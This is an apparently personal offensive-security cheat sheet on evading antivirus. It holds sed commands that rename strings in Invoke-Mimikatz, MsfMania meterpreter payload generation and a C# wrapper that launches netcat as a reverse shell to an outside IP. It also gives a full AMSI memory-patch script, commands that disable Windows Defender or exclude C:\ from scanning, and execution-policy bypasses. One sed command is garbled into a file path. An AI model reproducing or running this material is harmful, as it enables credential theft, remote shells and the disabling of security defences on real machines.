#### obfuscating powershell scripts to bypass AV



### Use PyFuscation to obfuscate powershell scripts which replace fucntions ,variables and parameters
https://github.com/CBHue/PyFuscation

> python3 PyFuscation.py -fvp --ps SharpHound.ps1


### USe chimera or chameleon
https://github.com/klezVirus/chameleon

> python3 chameleon.py -a mimikatz.ps1 -o mimichamelon.ps1


## Use Invoke-Stealth

https://github.com/JoelGMSec/Invoke-Stealth










IN below example invoke-mimikatz.ps1 is obfuscated so antivirus dont detect it

We can use this as an example for any powershell scripts because AV looks for malicuous strings like script name or string CREDS or etc. We can bypass this by changing the script contents but keeping the functionality intact.its like changing variable names in code.


sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1
sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1

sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1

sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1

sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Mimikatz.ps1

sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' 
Invoke-Mimikatz.ps1

sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions 
\$Win32Functions #\-/g" Invoke-Mimikatz./usr/share/doc/python3-impacket/examples/smbserver.py

# Powershell Scripts Obfuscater

Resources : https://www.varonis.com/blog/powershell-obfuscation-stealth-through-confusion-part-i/

Use powerop.py



# Crackmapexec AV bypassing



## Using our own amsi bypass file and then execute through CME 

>  crackmapexec smb 192.168.125.133 -u fcastle -p 'Password1' -d HYDRA.local -M empire_exec -o LISTENER=final --amsi-bypass bypassfile


## Similiarly we can use --obfs flag to obfusctae our modules to try to get stealthy




# Veil evasion


we can use veil framework to create obfucated payloads with custom settings


# To obfuscate msf payloads we can use phantom evasion or msf mania






### msfmania

> python3 MsfMania.py -a x64 -p windows/x64/meterpreter/reverse_http -lh 192.168.125.128 -lp 6969 -o update -it local


> python3 MsfMania.py -h



### Phantom-Evasion


This tool has a nice interface and we can obfuscate our msf paylaods of windows/linux/persistence/postexp/privesc type


### fud-backdoor

https://github.com/3ct0s/fud-backdoor


#### msfevasion advanced tips

https://www.infosecmatter.com/why-is-your-meterpreter-session-dying-try-these-fixes/

>   --list-options will provide us advanced options to set when creating msfvenom payloads




# Create malicious Documents

##### Luckystrike

https://github.com/curi0usJack/luckystrike






# Using web delivery module metasploit to bypass amsi and execute any msf payload of our choice

web delivery module sets up a server and we have to run a command on victim which will fetch the resource ffrom running msf server ,attempt to bypass AMSI and then execute our payload in memory

It supports python(mostly for Linux),php (Web application -If we have a rce we can run the command from this module), powershell(Mostly for windows)



# use INvoke Obfuscation script from github

https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Invoke-Obfuscation.ps1

https://medium.com/@ammadb/invoke-obfuscation-hiding-payloads-to-avoid-detection-87de291d61d3







# Wrapper reverse shell exeutable code (BYpass AV and windows defender)
  
  THis csharp code can be commpiled into exeutable using mono-devel compiler
  THis will make a execuatble which is a wrapper and will not be suspicious to AV and defenses. BUt internally it executes our malicuous code
  
  
  
  .......................
  
//IMporting basic modules which will help us start system processes
using System;  
using System.Diagnostics;


namespace Wrapper{
    class Program{
        static void Main()

       {
         
         //Creating an Process class object which is imported from System module
          Process proc = new Process();
          //Creating process info telling it instruction on what to do when started in system memory
          ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-cyberjunkie.exe", "10.50.49.32 10000 -e cmd.exe");
         
         
         //restrictig service to create a gui which may make users suspicious thats why disabling it
          procInfo.CreateNoWindow = true;
          //starting the proces
          proc.StartInfo = procInfo;
          proc.Start();

                               
        }
    }
}

  
  
  .......................
  
  compile this with  
  
  > mcs filename.cs
  
  now transfer the exeutable to target windows and make it execute somehow :)))
  









#### Disable Windows defender

 > "c:\Program Files\Windows Defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true

#### POwershell execution policy bypass



> powershell -ep bypass

> function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy  


> PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1


> PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1






####  Excluding C directory from antivirus scan as a safe side
 
 > powershell.exe
 > Add-MpPreference -ExclusionPath "c:\"
 
#### AMSI bypass in powershell


Go to amsi.fail and create a amsi bypass. It always create a unique byte code to avoid signatures





> powershell.exe 
> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic, Static').SetValue($null, $true) 

If this dont work try this
````powershell
Write-Host "-- AMSI Patch"
Write-Host "-- Paul Laîné (@am0nsec)"
Write-Host ""

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Kernel32

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}

[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
Write-Host "[+] AMSI DLL Handle: $hModule"

[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"

If ([IntPtr]::Size -eq 8) {
	Write-Host "[+] 64-bits process"
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
        0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
        0x57,                   # push    rdi
        0x41, 0x56,             # push    r14
        0x41, 0x57,             # push    r15
        0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
    )
} Else {
	Write-Host "[+] 32-bits process"
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,             # mov     edi,edi
        0x55,                   # push    ebp
        0x8B, 0xEC,             # mov     ebp,esp
        0x83, 0xEC, 0x18,       # sub     esp,18h
        0x53,                   # push    ebx
        0x56                    # push    esi
    )
}
[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
Write-Host "[+] Targeted address: $targetedAddress"

$oldProtectionBuffer = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

$patch = [byte[]] (
    0x31, 0xC0,    # xor rax, rax
    0xC3           # ret  
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$a = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null

`````
This will bypass amsi and now in order to test if amsi bypass worked

> ‘AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386’ 

#### stop windows defender service (admin privileges)

> sc stop WinDefend


#### Disable realtime monitoring Powershell (admin privileges)

> Set-MpPreference -DisableRealTimeMonitoring $true








